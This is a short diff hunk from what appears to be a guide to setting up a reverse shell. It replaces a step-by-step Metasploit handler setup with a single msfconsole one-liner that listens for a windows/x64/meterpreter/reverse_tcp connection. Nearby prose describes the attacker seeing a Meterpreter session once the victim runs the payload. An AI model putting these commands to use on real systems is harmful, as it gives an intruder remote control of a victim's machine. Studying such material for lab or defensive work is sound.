@@ -146,12 +146,7 @@ Russell:<br>
 
   To run a listener on attackers machine:
       
-      $msfconsole
-      $use exploit/multi/handler
-      $set PAYLOAD windows/x64/meterpreter/reverse_tcp
-      $set LHOST your_ip
-      $set LPORT 4444
-      $exploit
+    msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost {IP}; set lport {PORT}; exploit"
       
 
   Once the victim has executed the reverse shell, the attacker will see "Meterpreter session 1 opened." Lastly, the
